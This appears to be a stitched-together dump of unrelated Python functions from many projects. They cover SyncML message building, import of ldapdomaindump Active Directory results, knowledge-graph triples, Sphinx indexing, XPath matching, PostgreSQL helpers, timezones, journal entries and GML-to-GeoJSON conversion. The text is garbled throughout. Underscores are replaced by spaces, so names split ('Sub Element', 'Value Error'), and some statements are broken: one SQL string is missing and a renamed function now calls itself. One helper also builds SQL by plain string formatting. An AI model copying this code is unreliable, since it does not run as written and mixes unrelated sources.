Sub Element ( xerr , 'Message' ) . text = cmd . error Msg if cmd . error Trace is not None : ET . Sub Element ( xerr , 'Trace' ) . text = cmd . error Trace continue if cmd . name in [ constants . CMD GET , constants . CMD PUT ] : ET . Sub Element ( ET . Sub Element ( xcmd , 'Meta' ) , 'Type' , { 'xmlns' : constants . NAMESPACE METINF } ) . text = cmd . type if cmd . source is not None or cmd . target is not None or cmd . data : xitem = ET . Sub Element ( xcmd , 'Item' ) if cmd . source is not None : xsrc = ET . Sub Element ( xitem , 'Source' ) ET . Sub Element ( xsrc , 'Loc URI' ) . text = cmd . source ET . Sub Element ( xsrc , 'Loc Name' ) . text = cmd . source if cmd . target is not None : xtgt = ET . Sub Element ( xitem , 'Target' ) ET . Sub Element ( xtgt , 'Loc URI' ) . text = cmd . target ET . Sub Element ( xtgt , 'Loc Name' ) . text = cmd . target if cmd . data is not None : if isinstance ( cmd . data , basestring ) : ET . Sub Element ( xitem , 'Data' ) . text = cmd . data else : ET . Sub Element ( xitem , 'Data' ) . append ( cmd . data ) continue if cmd . name == constants . CMD RESULTS : ET . Sub Element ( xcmd , 'Msg Ref' ) . text = cmd . msg Ref ET . Sub Element ( xcmd , 'Cmd Ref' ) . text = cmd . cmd Ref ET . Sub Element ( ET . Sub Element ( xcmd , 'Meta' ) , 'Type' , { 'xmlns' : constants . NAMESPACE METINF } ) . text = cmd . type xitem = ET . Sub Element ( xcmd , 'Item' ) xsrc = ET . Sub Element ( xitem , 'Source' ) ET . Sub Element ( xsrc , 'Loc URI' ) . text = cmd . source ET . Sub Element ( xsrc , 'Loc Name' ) . text = cmd . source if cmd . data is not None : if isinstance ( cmd . data , basestring ) : ET . Sub Element ( xitem , 'Data' ) . text = cmd . data else : ET . Sub Element ( xitem , 'Data' ) . append ( cmd . data ) continue if cmd . name == constants . CMD SYNC : ET . Sub Element ( ET . Sub Element ( xcmd , 'Source' ) , 'Loc URI' ) . text = cmd . source ET . Sub Element ( ET . Sub Element ( xcmd , 'Target' ) , 'Loc URI' ) . text = cmd . target if cmd . noc is not None : ET . Sub Element ( xcmd , 'Number Of Changes' ) . text = cmd . noc if cmd . data is not None : for scmd in cmd . data : xscmd = ET . Sub Element ( xcmd , scmd . name ) if scmd . cmd ID is not None : ET . Sub Element ( xscmd , 'Cmd ID' ) . text = scmd . cmd ID if scmd . type is not None or ( scmd . format is not None and scmd . format != constants . FORMAT AUTO ) : xsmeta = ET . Sub Element ( xscmd , 'Meta' ) # todo: implement auto encoding determination... #       (the current implementation just lets XML encoding do it, #        which is for most things good enough, but not so good #        for sequences that need a large amount escaping such as #        binary data...) if scmd . format is not None and scmd . format != constants . FORMAT AUTO : ET . Sub Element ( xsmeta , 'Format' , { 'xmlns' : constants . NAMESPACE METINF } ) . text = scmd . format if scmd . type is not None : ET . Sub Element ( xsmeta , 'Type' , { 'xmlns' : constants . NAMESPACE METINF } ) . text = scmd . type xsitem = ET . Sub Element ( xscmd , 'Item' ) if scmd . source is not None : ET . Sub Element ( ET . Sub Element ( xsitem , 'Source' ) , 'Loc URI' ) . text = scmd . source if scmd . source Parent is not None : ET . Sub Element ( ET . Sub Element ( xsitem , 'Source Parent' ) , 'Loc URI' ) . text = scmd . source Parent if scmd . target is not None : ET . Sub Element ( ET . Sub Element ( xsitem , 'Target' ) , 'Loc URI' ) . text = scmd . target if scmd . target Parent is not None : ET . Sub Element ( ET . Sub Element ( xsitem , 'Target Parent' ) , 'Loc URI' ) . text = scmd . target Parent if scmd . data is not None : if isinstance ( scmd . data , basestring ) : ET . Sub Element ( xsitem , 'Data' ) . text = scmd . data else : ET . Sub Element ( xsitem , 'Data' ) . append ( scmd . data ) continue if cmd . name == constants . CMD MAP : ET . Sub Element ( ET . Sub Element ( xcmd , 'Source' ) , 'Loc URI' ) . text = cmd . source ET . Sub Element ( ET . Sub Element ( xcmd , 'Target' ) , 'Loc URI' ) . text = cmd . target if cmd . source Item is not None or cmd . target Item is not None : xitem = ET . Sub Element ( xcmd , constants . CMD MAPITEM ) if cmd . source Item is not None : ET . Sub Element ( ET . Sub Element ( xitem , 'Source' ) , 'Loc URI' ) . text = cmd . source Item if cmd . target Item is not None : ET . Sub Element ( ET . Sub Element ( xitem , 'Target' ) , 'Loc URI' ) . text = cmd . target Item continue if cmd . name == constants . CMD FINAL : if cmdidx + 1 < len ( commands ) : raise common . Internal Error ( 'command "%s" not at tail end of commands' % ( cmd . name , ) ) continue raise common . Internal Error ( 'unexpected command "%s"' % ( cmd . name , ) ) return xsync
def tree2commands ( self , adapter , session , lastcmds , xsync ) : # do some preliminary sanity checks... # todo: do i really want to be using assert statements?... assert xsync . tag == constants . NODE SYNCML assert len ( xsync ) == 2 assert xsync [ 0 ] . tag == constants . CMD SYNCHDR assert xsync [ 1 ] . tag == constants . NODE SYNCBODY version = xsync [ 0 ] . findtext ( 'Ver Proto' ) if version != constants . SYNCML VERSION 1 2 : raise common . Feature Not Supported ( 'unsupported Sync ML version "%s" (expected "%s")' % ( version , constants . SYNCML VERSION 1 2 ) ) verdtd = xsync [ 0 ] . findtext ( 'Ver DTD' ) if verdtd != constants . SYNCML DTD VERSION 1 2 : raise common . Feature Not Supported ( 'unsupported Sync ML DTD version "%s" (expected "%s")' % ( verdtd , constants . SYNCML DTD VERSION 1 2 ) ) ret = self . initialize ( adapter , session , xsync ) hdrcmd = ret [ 0 ] if session . is Server : log . debug ( 'received request Sync ML message from "%s" (s%s.m%s)' , hdrcmd . target , hdrcmd . session ID , hdrcmd . msg ID ) else : log . debug ( 'received response Sync ML message from "%s" (s%s.m%s)' , lastcmds [ 0 ] . target , lastcmds [ 0 ] . session ID , lastcmds [ 0 ] . msg ID ) try : return self . tree2commands ( adapter , session , lastcmds , xsync , ret ) except Exception , e : if not session . is Server : raise # TODO: make this configurable as to whether or not any error #       is sent back to the peer as a Sync ML "standardized" error #       status... code = '%s.%s' % ( e . class . module , e . class . name ) msg = '' . join ( traceback . format exception only ( type ( e ) , e ) ) . strip ( ) log . exception ( 'failed while interpreting command tree: %s' , msg ) # TODO: for some reason, the active exception is not being logged... return [ hdrcmd , state . Command ( name = constants . CMD STATUS , cmd ID = '1' , msg Ref = session . pending Msg ID , cmd Ref = 0 , source Ref = xsync [ 0 ] . findtext ( 'Source/Loc URI' ) , target Ref = xsync [ 0 ] . findtext ( 'Target/Loc URI' ) , status Of = constants . CMD SYNCHDR , status Code = constants . STATUS COMMAND FAILED , error Code = code , error Msg = msg , error Trace = '' . join ( traceback . format exception ( type ( e ) , e , sys . exc info ( ) [ 2 ] ) ) , ) , state . Command ( name = constants . CMD FINAL ) ]
def parse single computer ( entry ) : computer = Computer ( dns hostname = get field ( entry , 'd NS Host Name' ) , description = get field ( entry , 'description' ) , os = get field ( entry , 'operating System' ) , group id = get field ( entry , 'primary Group ID' ) ) try : ip = str ( ipaddress . ip address ( get field ( entry , 'I Pv4' ) ) ) except Value Error : ip = '' if ip : computer . ip = ip elif computer . dns hostname : computer . ip = resolve ip ( computer . dns hostname ) return computer
def parse domain computers ( filename ) : with open ( filename ) as f : data = json . loads ( f . read ( ) ) hs = Host Search ( ) count = 0 entry count = 0 print notification ( "Parsing {} entries" . format ( len ( data ) ) ) for system in data : entry count += 1 parsed = parse single computer ( system ) if parsed . ip : try : host = hs . id to object ( parsed . ip ) host . description . append ( parsed . description ) host . hostname . append ( parsed . dns hostname ) if parsed . os : host . os = parsed . os host . domain controller = parsed . dc host . add tag ( 'domaindump' ) host . save ( ) count += 1 except Value Error : pass sys . stdout . write ( '\r' ) sys . stdout . write ( "[{}/{}] {} resolved" . format ( entry count , len ( data ) , count ) ) sys . stdout . flush ( ) sys . stdout . write ( '\r' ) return count
def parse user ( entry , domain groups ) : result = { } distinguished name = get field ( entry , 'distinguished Name' ) result [ 'domain' ] = "." . join ( distinguished name . split ( ',DC=' ) [ 1 : ] ) result [ 'name' ] = get field ( entry , 'name' ) result [ 'username' ] = get field ( entry , 's AM Account Name' ) result [ 'description' ] = get field ( entry , 'description' ) result [ 'sid' ] = get field ( entry , 'object Sid' ) . split ( '-' ) [ - 1 ] primary group = get field ( entry , 'primary Group ID' ) member of = entry [ 'attributes' ] . get ( 'member Of' , [ ] ) groups = [ ] for member in member of : for e in member . split ( ',' ) : if e . startswith ( 'CN=' ) : groups . append ( e [ 3 : ] ) groups . append ( domain groups . get ( primary group , '' ) ) result [ 'groups' ] = groups flags = [ ] try : uac = int ( get field ( entry , 'user Account Control' ) ) for flag , value in uac flags . items ( ) : if uac & value : flags . append ( flag ) except Value Error : pass result [ 'flags' ] = flags return result
def parse domain users ( domain users file , domain groups file ) : with open ( domain users file ) as f : users = json . loads ( f . read ( ) ) domain groups = { } if domain groups file : with open ( domain groups file ) as f : groups = json . loads ( f . read ( ) ) for group in groups : sid = get field ( group , 'object Sid' ) domain groups [ int ( sid . split ( '-' ) [ - 1 ] ) ] = get field ( group , 'cn' ) user search = User Search ( ) count = 0 total = len ( users ) print notification ( "Importing {} users" . format ( total ) ) for entry in users : result = parse user ( entry , domain groups ) user = user search . id to object ( result [ 'username' ] ) user . name = result [ 'name' ] user . domain . append ( result [ 'domain' ] ) user . description = result [ 'description' ] user . groups . extend ( result [ 'groups' ] ) user . flags . extend ( result [ 'flags' ] ) user . sid = result [ 'sid' ] user . add tag ( "domaindump" ) user . save ( ) count += 1 sys . stdout . write ( '\r' ) sys . stdout . write ( "[{}/{}]" . format ( count , total ) ) sys . stdout . flush ( ) sys . stdout . write ( '\r' ) return count
def import domaindump ( ) : parser = argparse . Argument Parser ( description = "Imports users, groups and computers result files from the ldapdomaindump tool, will resolve the names from domain computers output for I Ps" ) parser . add argument ( "files" , nargs = '+' , help = "The domaindump files to import" ) arguments = parser . parse args ( ) domain users file = '' domain groups file = '' computer count = 0 user count = 0 stats = { } for filename in arguments . files : if filename . endswith ( 'domain computers.json' ) : print notification ( 'Parsing domain computers' ) computer count = parse domain computers ( filename ) if computer count : stats [ 'hosts' ] = computer count print success ( "{} hosts imported" . format ( computer count ) ) elif filename . endswith ( 'domain users.json' ) : domain users file = filename elif filename . endswith ( 'domain groups.json' ) : domain groups file = filename if domain users file : print notification ( "Parsing domain users" ) user count = parse domain users ( domain users file , domain groups file ) if user count : print success ( "{} users imported" . format ( user count ) ) stats [ 'users' ] = user count Logger ( ) . log ( "import domaindump" , 'Imported domaindump, found {} user, {} systems' . format ( user count , computer count ) , stats )
def unicode ( string ) : for encoding in [ 'utf-8' , 'latin1' ] : try : result = unicode ( string , encoding ) return result except Unicode Decode Error : pass result = unicode ( string , 'utf-8' , 'replace' ) return result
def build index and mapping ( triples ) : ents = bidict ( ) rels = bidict ( ) ent id = 0 rel id = 0 collected = [ ] for t in triples : for e in ( t . head , t . tail ) : if e not in ents : ents [ e ] = ent id ent id += 1 if t . relation not in rels : rels [ t . relation ] = rel id rel id += 1 collected . append ( kgedata . Triple Index ( ents [ t . head ] , rels [ t . relation ] , ents [ t . tail ] ) ) return collected , ents , rels
def recover triples from mapping ( indexes , ents : bidict , rels : bidict ) : triples = [ ] for t in indexes : triples . append ( kgedata . Triple ( ents . inverse [ t . head ] , rels . inverse [ t . relation ] , ents . inverse [ t . tail ] ) ) return triples
def transform triple numpy ( x ) : return np . array ( [ x . head , x . relation , x . tail ] , dtype = np . int64 )
def pack triples numpy ( triples ) : if len ( triples ) == 0 : return np . array ( [ ] , dtype = np . int64 ) return np . stack ( list ( map ( transform triple numpy , triples ) ) , axis = 0 )
def remove near duplicate relation ( triples , threshold = 0.97 ) : logging . debug ( "remove duplicate" ) assert threshold ( threshold ) duplicate rel counter = defaultdict ( list ) relations = set ( ) for t in triples : duplicate rel counter [ t . relation ] . append ( f"{t.head} {t.tail}" ) relations . add ( t . relation ) relations = list ( relations ) num triples = len ( triples ) removal relation set = set ( ) for rel , values in duplicate rel counter . items ( ) : duplicate rel counter [ rel ] = Superminhash ( values ) for i in relations : for j in relations : if i == j or i in removal relation set or j in removal relation set : continue close relations = [ i ] if set close to ( duplicate rel counter [ i ] , duplicate rel counter [ j ] , threshold ) : close relations . append ( j ) if len ( close relations ) > 1 : close relations . pop ( np . random . randint ( len ( close relations ) ) ) removal relation set |= set ( close relations ) logging . info ( "Removing {} relations: {}" . format ( len ( removal relation set ) , str ( removal relation set ) ) ) return list ( filterfalse ( lambda x : x . relation in removal relation set , triples ) )
def remove direct link triples ( train , valid , test ) : pairs = set ( ) merged = valid + test for t in merged : pairs . add ( ( t . head , t . tail ) ) filtered = filterfalse ( lambda t : ( t . head , t . tail ) in pairs or ( t . tail , t . head ) in pairs , train ) return list ( filtered )
def shrink indexes in place ( self , triples ) : ent roots = self . Union Find ( self . ent id ) rel roots = self . Union Find ( self . rel id ) for t in triples : ent roots . add ( t . head ) ent roots . add ( t . tail ) rel roots . add ( t . relation ) for i , t in enumerate ( triples ) : h = ent roots . find ( t . head ) r = rel roots . find ( t . relation ) t = ent roots . find ( t . tail ) triples [ i ] = kgedata . Triple Index ( h , r , t ) ents = bidict ( ) available ent idx = 0 for previous idx , ent exist in enumerate ( ent roots . roots ( ) ) : if not ent exist : self . ents . inverse . pop ( previous idx ) else : ents [ self . ents . inverse [ previous idx ] ] = available ent idx available ent idx += 1 rels = bidict ( ) available rel idx = 0 for previous idx , rel exist in enumerate ( rel roots . roots ( ) ) : if not rel exist : self . rels . inverse . pop ( previous idx ) else : rels [ self . rels . inverse [ previous idx ] ] = available rel idx available rel idx += 1 self . ents = ents self . rels = rels self . ent id = available ent idx self . rel id = available rel idx
def freeze ( self ) : data = super ( Index Builder , self ) . freeze ( ) try : # Sphinx >= 1.5 format # Due to changes from github.com/sphinx-doc/sphinx/pull/2454 base file names = data [ 'docnames' ] except Key Error : # Sphinx < 1.5 format base file names = data [ 'filenames' ] store = { } c = itertools . count ( ) for prefix , items in iteritems ( data [ 'objects' ] ) : for name , ( index , typeindex , , shortanchor ) in iteritems ( items ) : objtype = data [ 'objtypes' ] [ typeindex ] if objtype . startswith ( 'cpp:' ) : split = name . rsplit ( '::' , 1 ) if len ( split ) != 2 : warnings . warn ( "What's up with %s?" % str ( ( prefix , name , objtype ) ) ) continue prefix , name = split last prefix = prefix . split ( '::' ) [ - 1 ] else : last prefix = prefix . split ( '.' ) [ - 1 ] store [ next ( c ) ] = { 'filename' : base file names [ index ] , 'objtype' : objtype , 'prefix' : prefix , 'last prefix' : last prefix , 'name' : name , 'shortanchor' : shortanchor , } data . update ( { 'store' : store } ) return data
def log entity creation ( entity , params = None ) : p = { 'entity' : entity } if params : p [ 'params' ] = params log ( TYPE CODES . CREATE , p )
def log entity deletion ( entity , params = None ) : p = { 'entity' : entity } if params : p [ 'params' ] = params log ( TYPE CODES . DELETE , p )
def log operation ( entities , operation name , params = None ) : if isinstance ( entities , ( list , tuple ) ) : entities = list ( entities ) else : entities = [ entities ] p = { 'name' : operation name , 'on' : entities } if params : p [ 'params' ] = params log ( TYPE CODES . OPERATION , p )
def log state ( entity , state ) : p = { 'on' : entity , 'state' : state } log ( TYPE CODES . STATE , p )
def log update ( entity , update ) : p = { 'on' : entity , 'update' : update } log ( TYPE CODES . UPDATE , p )
def format value ( value ) : value id = id ( value ) if value id in recursion breaker . processed : return u'<recursion>' recursion breaker . processed . add ( value id ) try : if isinstance ( value , six . binary type ) : # suppose, all byte strings are in unicode # don't know if everybody in the world uses anything else? return u"'{0}'" . format ( value . decode ( 'utf-8' ) ) elif isinstance ( value , six . text type ) : return u"u'{0}'" . format ( value ) elif isinstance ( value , ( list , tuple ) ) : # long lists or lists with multiline items # will be shown vertically values = list ( map ( format value , value ) ) result = serialize list ( u'[' , values , delimiter = u',' ) + u']' return force unicode ( result ) elif isinstance ( value , dict ) : items = six . iteritems ( value ) # format each key/value pair as a text, # calling format value recursively items = ( tuple ( map ( format value , item ) ) for item in items ) items = list ( items ) # sort by keys for readability items . sort ( ) # for each item value items = [ serialize text ( u'{0}: ' . format ( key ) , item value ) for key , item value in items ] # and serialize these pieces as a list, enclosing # them into a curve brackets result = serialize list ( u'{' , items , delimiter = u',' ) + u'}' return force unicode ( result ) return force unicode ( repr ( value ) ) finally : recursion breaker . processed . remove ( value id )
def traverse ( element , query , deep = False ) : # Grab the next part of the query (it will be chopped from the front each iteration). part = query [ 0 ] if not part : # If the part is blank, we encountered a //, meaning search all sub-nodes. query = query [ 1 : ] part = query [ 0 ] deep = True # Parse out any predicate (tag[pred]) from this part of the query. part , predicate = xpath re . match ( query [ 0 ] ) . groups ( ) for c in element . children : if part in ( '*' , c . tagname ) and c . match ( predicate ) : # A potential matching branch: this child matches the next query part (and predicate). if len ( query ) == 1 : # If this is the last part of the query, we found a matching element, yield it. yield c else : # Otherwise, check the children of this child against the next query part. for e in traverse ( c , query [ 1 : ] ) : yield e if deep : # If we're searching all sub-nodes, traverse with the same query, regardless of matching. # This basically creates a recursion branch to search EVERYWHERE for anything after //. for e in traverse ( c , query , deep = True ) : yield e
def parse query ( query ) : parts = query . split ( '/' ) norm = [ ] for p in parts : p = p . strip ( ) if p : norm . append ( p ) elif '' not in norm : norm . append ( '' ) return norm
def match ( self , pred ) : if not pred : return True # Strip off the [ and ] pred = pred [ 1 : - 1 ] if pred . startswith ( '@' ) : # An attribute predicate checks the existence (and optionally value) of an attribute on this tag. pred = pred [ 1 : ] if '=' in pred : attr , value = pred . split ( '=' , 1 ) if value [ 0 ] in ( '"' , "'" ) : value = value [ 1 : ] if value [ - 1 ] in ( '"' , "'" ) : value = value [ : - 1 ] return self . attrs . get ( attr ) == value else : return pred in self . attrs elif num re . match ( pred ) : # An index predicate checks whether we are the n-th child of our parent (0-based). index = int ( pred ) if index < 0 : if self . parent : # For negative indexes, count from the end of the list. return self . index == ( len ( self . parent . children ) + index ) else : # If we're the root node, the only index we could be is 0. return index == 0 else : return index == self . index else : if '=' in pred : tag , value = pred . split ( '=' , 1 ) if value [ 0 ] in ( '"' , "'" ) : value = value [ 1 : ] if value [ - 1 ] in ( '"' , "'" ) : value = value [ : - 1 ] for c in self . children : if c . tagname == tag and c . data == value : return True else : # A plain [tag] predicate means we match if we have a child with tagname "tag". for c in self . children : if c . tagname == pred : return True return False
def get printable columns ( columns , row ) : if not columns : return row # Extract the column values, in the order specified. return tuple ( row [ c ] for c in columns )
def image path ( instance , filename ) : filename , ext = os . path . splitext ( filename . lower ( ) ) instance id hash = hashlib . md5 ( str ( instance . id ) ) . hexdigest ( ) filename hash = '' . join ( random . sample ( hashlib . md5 ( filename . encode ( 'utf-8' ) ) . hexdigest ( ) , 8 ) ) return '{}/{}{}' . format ( instance id hash , filename hash , ext )
def ensure format ( doc , format ) : assert format in ( 'xml' , 'json' ) if getattr ( doc , 'tag' , None ) == 'open511' : if format == 'json' : return xml to json ( doc ) elif isinstance ( doc , dict ) and 'meta' in doc : if format == 'xml' : return json doc to xml ( doc ) else : raise Value Error ( "Unrecognized input document" ) return doc
def rename ( self , from name , to name ) : log . info ( 'renaming database from %s to %s' % ( from name , to name ) ) self . run stmt ( 'alter database %s rename to %s' % ( from name , to name ) )
def connections ( self , name ) : stmt = . format ( fields = ', ' . join ( CONNECTION FIELDS ) , datname = name ) return list ( Connection ( * * x ) for x in self . iter results ( stmt ) )
def available ( self , timeout = 5 ) : host = self . connect args [ 'host' ] port = self . connect args [ 'port' ] try : sock = socket . create connection ( ( host , port ) , timeout = timeout ) sock . close ( ) return True except socket . error : pass return False
def settings ( self ) : stmt = "select {fields} from pg settings" . format ( fields = ', ' . join ( SETTINGS FIELDS ) ) settings = [ ] for row in self . iter results ( stmt ) : row [ 'setting' ] = self . vartype map [ row [ 'vartype' ] ] ( row [ 'setting' ] ) settings . append ( Settings ( * * row ) ) return settings
def breakfast ( self , message = "Breakfast is ready" , shout : bool = False ) : return self . helper . output ( message , shout )
def lunch ( self , message = "Time for lunch" , shout : bool = False ) : return self . helper . output ( message , shout )
def dinner ( self , message = "Dinner is served" , shout : bool = False ) : return self . helper . output ( message , shout )
def main ( ) : parser = argparse . Argument Parser ( description = 'Discover and ingest metadata from document sources, ' 'including lsstdoc-based La Te X documents and ' 're Structured Text-based technotes. Metadata can be ' 'upserted into the LSST Projectmeta Mongo DB.' ) parser . add argument ( '--ltd-product' , dest = 'ltd product url' , help = 'URL of an LSST the Docs product ' '(https://keeper.lsst.codes/products/<slug>). If provided, ' 'only this document will be ingested.' ) parser . add argument ( '--github-token' , help = 'Git Hub personal access token.' ) parser . add argument ( '--mongodb-uri' , help = 'Mongo DB connection URI. If provided, metadata will be loaded ' 'into the Projectmeta database. Omit this argument to just ' 'test the ingest pipeline.' ) parser . add argument ( '--mongodb-db' , default = 'lsstprojectmeta' , help = 'Name of Mongo DB database' ) parser . add argument ( '--mongodb-collection' , default = 'resources' , help = 'Name of the Mongo DB collection for projectmeta resources' ) args = parser . parse args ( ) # Configure the root logger stream handler = logging . Stream Handler ( ) stream formatter = logging . Formatter ( '%(asctime)s %(levelname)8s %(name)s | %(message)s' ) stream handler . set Formatter ( stream formatter ) root logger = logging . get Logger ( ) root logger . add Handler ( stream handler ) root logger . set Level ( logging . WARNING ) # Configure app logger app logger = logging . get Logger ( 'lsstprojectmeta' ) app logger . set Level ( logging . DEBUG ) if args . mongodb uri is not None : mongo client = Async IO Motor Client ( args . mongodb uri , ssl = True ) collection = mongo client [ args . mongodb db ] [ args . mongodb collection ] else : collection = None loop = asyncio . get event loop ( ) if args . ltd product url is not None : # Run single technote loop . run until complete ( run single ltd doc ( args . ltd product url , args . github token , collection ) ) else : # Run bulk technote processing loop . run until complete ( run bulk etl ( args . github token , collection ) )
def decorator ( decorator func ) : assert callable ( decorator func ) , type ( decorator func ) def decorator ( func = None , * * kwargs ) : assert func is None or callable ( func ) , type ( func ) if func : return decorator func ( func , * * kwargs ) else : def decorator helper ( func ) : return decorator func ( func , * * kwargs ) return decorator helper return decorator
def make aware ( value , timezone ) : if hasattr ( timezone , 'localize' ) and value not in ( datetime . datetime . min , datetime . datetime . max ) : # available for pytz time zones return timezone . localize ( value , is dst = None ) else : # may be wrong around DST changes return value . replace ( tzinfo = timezone )
def make naive ( value , timezone ) : value = value . astimezone ( timezone ) if hasattr ( timezone , 'normalize' ) : # available for pytz time zones value = timezone . normalize ( value ) return value . replace ( tzinfo = None )
def to timezone ( self , dt ) : if timezone . is aware ( dt ) : return dt . astimezone ( self . timezone ) else : return timezone . make aware ( dt , self . timezone )
def period ( self ) : start time = self . root . findtext ( 'daily start time' ) if start time : return Period ( text to time ( start time ) , text to time ( self . root . findtext ( 'daily end time' ) ) ) return Period ( datetime . time ( 0 , 0 ) , datetime . time ( 23 , 59 ) )
async def download metadata yaml ( session , github url ) : metadata yaml url = build metadata yaml url ( github url ) async with session . get ( metadata yaml url ) as response : response . raise for status ( ) yaml data = await response . text ( ) return yaml . safe load ( yaml data )
def tz ( self ) : if not self . tz : self . tz = tzlocal . get localzone ( ) . zone return self . tz
def time ( self , t ) : time = arrow . get ( t ) . format ( 'YYYY-MM-DDTHH:mm:ss' ) self . time = datetime . datetime . strptime ( time , '%Y-%m-%d T%H:%M:%S' )
def as dict ( self ) : entry dict = { } entry dict [ 'UUID' ] = self . uuid entry dict [ 'Creation Date' ] = self . time entry dict [ 'Time Zone' ] = self . tz if self . tags : entry dict [ 'Tags' ] = self . tags entry dict [ 'Entry Text' ] = self . text entry dict [ 'Starred' ] = self . starred entry dict [ 'Location' ] = self . location return entry dict
def save ( self , entry , with location = True , debug = False ) : entry dict = { } if isinstance ( entry , Day One Entry ) : # Get a dict of the Day One Entry entry dict = entry . as dict ( ) else : entry dict = entry # Set the UUID entry dict [ 'UUID' ] = uuid . uuid4 ( ) . get hex ( ) if with location and not entry dict [ 'Location' ] : entry dict [ 'Location' ] = self . get location ( ) # Do we have everything needed? if not all ( ( entry dict [ 'UUID' ] , entry dict [ 'Time Zone' ] , entry dict [ 'Entry Text' ] ) ) : print "You must provide: Time zone, UUID, Creation Date, Entry Text" return False if debug is False : file path = self . file path ( entry dict [ 'UUID' ] ) plistlib . write Plist ( entry dict , file path ) else : plist = plistlib . write Plist To String ( entry dict ) print plist return True
def file path ( self , uid ) : file name = '%s.doentry' % ( uid ) return os . path . join ( self . dayone journal path , file name )
def combine ( self , members , output file , dimension = None , start index = None , stop index = None , stride = None ) : nco = None try : nco = Nco ( ) except Base Exception : # This is not necessarily an import error (could be wrong PATH) raise Import Error ( "NCO not found.  The NCO python bindings are required to use 'Collection.combine'." ) if len ( members ) > 0 and hasattr ( members [ 0 ] , 'path' ) : # A member Dot Doct was passed in, we only need the paths members = [ m . path for m in members ] options = [ '-4' ] # Net CDF4 options += [ '-L' , '3' ] # Level 3 compression options += [ '-h' ] # Don't append to the history global attribute if dimension is not None : if start index is None : start index = 0 if stop index is None : stop index = '' if stride is None : stride = 1 options += [ '-d' , '{0},{1},{2},{3}' . format ( dimension , start index , stop index , stride ) ] nco . ncrcat ( input = members , output = output file , options = options )
def get parameters ( self ) : if self . plugin class is None : sig = inspect . signature ( self . func ) for index , parameter in enumerate ( sig . parameters . values ( ) ) : if not parameter . kind in [ parameter . POSITIONAL ONLY , parameter . KEYWORD ONLY , parameter . POSITIONAL OR KEYWORD ] : raise Runtime Error ( "Task {} contains an unsupported {} parameter" . format ( parameter , parameter . kind ) ) yield parameter else : var keyword seen = set ( ) for cls in inspect . getmro ( self . plugin class ) : if issubclass ( cls , Base Plugin ) and hasattr ( cls , self . func . name ) : func = getattr ( cls , self . func . name ) logger . debug ( "Found method %s from class %s" , func , cls ) var keyword found = False sig = inspect . signature ( func ) for index , parameter in enumerate ( sig . parameters . values ( ) ) : if index == 0 : # skip "self" parameter continue if parameter . kind == inspect . Parameter . VAR KEYWORD : # found "**kwargs" parameter.  we will continue to the next class in the mro # to add any keyword parameters we have not yet used (i.e. whose name # we have not yet seen) var keyword found = True continue if parameter . kind in [ parameter . POSITIONAL ONLY , parameter . VAR POSITIONAL ] : raise Runtime Error ( "Task {} contains an unsupported parameter \"{}\"" . format ( func , parameter ) ) if not parameter . name in var keyword seen : var keyword seen . add ( parameter . name ) logger . debug ( "Found parameter %s (%s)" , parameter , parameter . kind ) yield parameter # we only need to look at the next class in the mro # when "**kwargs" is found if not var keyword found : break
def get configuration ( self , key , default = None ) : if key in self . config : return self . config . get ( key ) else : return default
def gml to geojson ( el ) : if el . get ( 'srs Name' ) not in ( 'urn:ogc:def:crs:EPSG::4326' , None ) : if el . get ( 'srs Name' ) == 'EPSG:4326' : return gmlv2 to geojson ( el ) else : raise Not Implemented Error ( "Unrecognized srs Name %s" % el . get ( 'srs Name' ) ) tag = el . tag . replace ( '{%s}' % NS GML , '' ) if tag == 'Point' : coordinates = reverse gml coords ( el . findtext ( '{%s}pos' % NS GML ) ) [ 0 ] elif tag == 'Line String' : coordinates = reverse gml coords ( el . findtext ( '{%s}pos List' % NS GML ) ) elif tag == 'Polygon' : coordinates = [ ] for ring in el . xpath ( 'gml:exterior/gml:Linear Ring/gml:pos List' , namespaces = NSMAP ) + el . xpath ( 'gml:interior/gml:Linear Ring/gml:pos List' , namespaces = NSMAP ) : coordinates . append ( reverse gml coords ( ring . text ) ) elif tag in ( 'Multi Point' , 'Multi Line String' , 'Multi Polygon' ) : single type = tag [ 5 : ] member tag = single type [ 0 ] . lower ( ) + single type [ 1 : ] + 'Member' coordinates = [ gml to geojson ( member ) [ 'coordinates' ] for member in el . xpath ( 'gml:%s/gml:%s' % ( member tag , single type ) , namespaces = NSMAP ) ] else : raise Not Implemented Error return { 'type' : tag , 'coordinates' : coordinates }
def gmlv2 to geojson ( el ) : tag = el . tag . replace ( '{%s}' % NS GML , '' ) if tag == 'Point' : coordinates = [ float ( c ) for c in el . findtext ( '{%s}coordinates' % NS GML ) . split ( ',' ) ] elif tag == 'Line String' : coordinates = [ [ float ( x ) for x in pair . split ( ',' ) ] for pair in el . findtext ( '{%s}coordinates' % NS GML ) . split ( ' ' ) ] elif tag == 'Polygon' : coordinates = [ ] for ring in el . xpath ( 'gml:outer Boundary Is/gml:Linear Ring/gml:coordinates' , namespaces = NSMAP ) + el . xpath ( 'gml:inner Boundary Is/gml:Linear Ring/gml:coordinates' , namespaces = NSMAP ) : coordinates . append ( [ [ float ( x ) for x in pair . split ( ',' ) ] for pair in ring . text . split ( ' ' ) ] ) elif tag in ( 'Multi Point' , 'Multi Line String' , 'Multi Polygon' , 'Multi Curve' ) : if tag == 'Multi Curve' : single type = 'Line String' member tag = 'curve Member' else : single type = tag [ 5 : ] member tag = single type [ 0 ] . lower ( ) + single type [ 1 : ] + 'Member' coordinates = [ gml to geojson ( member ) [ 'coordinates' ] for member in el . xpath ( 'gml:%s/gml:%s' % ( member tag , single type ) , namespaces = NSMAP ) ] else : raise Not Implemented Error return { 'type' : tag , 'coordinates' : coordinates }
def all subclasses ( cls ) : for subclass in cls . subclasses ( ) : yield subclass for subc in all subclasses ( subclass ) : yield subc
def unique justseen ( iterable , key = None ) : # unique justseen('AAAABBBCCDAABBB') --> A B C D A B # unique justseen('ABB Cc AD', str.lower) --> A B C A D try : # PY2 support from itertools import imap as map except Import Error : from builtins import map return map ( next , map ( operator . itemgetter ( 1 ) , itertools . groupby ( iterable , key ) ) )
def default ( self , obj ) : if isinstance ( obj , np . ndarray ) : return obj . tolist ( ) elif isinstance ( obj , np . generic ) : return np . asscalar ( obj ) # Let the base class default method raise the Type Error return json . JSON Encoder ( self , obj )
def find repos ( self , depth = 10 ) : repos = [ ] for root , subdirs , files in walk dn ( self . root , depth = depth ) : if 'modules' in root : continue if '.git' in subdirs : repos . append ( root ) return repos
